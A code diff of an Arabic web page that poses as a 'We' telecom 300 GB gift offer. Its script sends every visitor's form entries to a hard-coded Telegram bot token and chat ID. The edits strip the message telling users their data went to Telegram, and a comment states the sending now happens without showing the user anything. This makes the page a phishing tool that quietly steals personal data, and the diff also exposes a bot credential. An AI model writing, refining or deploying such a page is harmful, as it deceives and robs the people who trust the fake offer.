@@ -757,7 +757,6 @@
                 <p>شكراً لك! تم استلام طلبك للحصول على هدية 300 جيجابايت من We. سنتواصل معك في غضون 24 ساعة لتأكيد تفاصيل الهدية وتفعيلها.</p>
                 <p>رقم الطلب: <strong>WE-<span id="orderNumber">0000</span></strong></p>
                 <p style="margin-top: 15px;"><i class="fas fa-envelope"></i> سيصلك تأكيد على بريدك الإلكتروني خلال دقائق.</p>
-                <p id="telegramResult" style="margin-top: 15px; font-weight: bold; color: #155724;"></p>
             </div>
         </section>
 
@@ -840,7 +839,6 @@
     <script>
         // إعدادات بوت تليجرام
         const TELEGRAM_BOT_TOKEN = '8472959478:AAGsdc0sHLd1zEsBFUFnvPS7Oxxra0PtaVE';
-        // chat_id الخاص بك من البيانات التي قدمتها
         const TELEGRAM_CHAT_ID = '848066586';
         
         // التحكم في عرض نموذج الهدية
@@ -953,23 +951,10 @@
                 const result = await response.json();
                 console.log('تم إرسال البيانات إلى تليجرام:', result);
                 
-                if (result.ok) {
-                    return { 
-                        success: true, 
-                        message: '✅ تم إرسال بياناتك إلى بوت تليجرام بنجاح! ستصل إليك رسالة تأكيد قريباً.' 
-                    };
-                } else {
-                    return { 
-                        success: false, 
-                        message: `❌ فشل إرسال البيانات: ${result.description || 'خطأ غير معروف'}` 
-                    };
-                }
+                return result.ok;
             } catch (error) {
                 console.error('خطأ في إرسال البيانات إلى تليجرام:', error);
-                return { 
-                    success: false, 
-                    message: `❌ خطأ في الاتصال: ${error.message}` 
-                };
+                return false;
             }
         }
         
@@ -1000,8 +985,8 @@
             // إظهار شاشة التحميل
             document.getElementById('loader').style.display = 'flex';
             
-            // إرسال البيانات إلى تليجرام
-            const telegramResult = await sendToTelegram(formData);
+            // إرسال البيانات إلى تليجرام (بدون إظهار أي رسالة للمستخدم)
+            await sendToTelegram(formData);
             
             // إخفاء شاشة التحميل
             setTimeout(() => {
@@ -1022,24 +1007,12 @@
                 document.getElementById('giftRequestForm').style.display = 'none';
                 document.getElementById('confirmationMessage').style.display = 'block';
                 
-                // إضافة نتيجة إرسال تليجرام
-                const telegramResultElement = document.getElementById('telegramResult');
-                telegramResultElement.textContent = telegramResult.message;
-                telegramResultElement.style.color = telegramResult.success ? '#155724' : '#721c24';
-                
                 // تمرير المستخدم لرسالة التأكيد
                 document.getElementById('confirmationMessage').scrollIntoView({ behavior: 'smooth' });
                 
                 // طباعة البيانات في وحدة التحكم لأغراض الاختبار
                 console.log('بيانات الطلب المقدمة:', formData);
                 console.log('رقم الطلب: WE-' + orderNumber);
-                console.log('نتيجة إرسال تليجرام:', telegramResult);
-                
-                // إرسال رسالة تأكيد إضافية إلى المستخدم إذا كان البوت ناجحاً
-                if (telegramResult.success) {
-                    // يمكن إضافة إرسال رسالة تأكيد إلى بريد المستخدم هنا
-                    console.log('تم إرسال تأكيد إلى بريد المستخدم:', formData.email);
-                }
                 
                 // إعادة تعيين النموذج بعد 10 ثوان (لأغراض العرض)
                 setTimeout(() => {
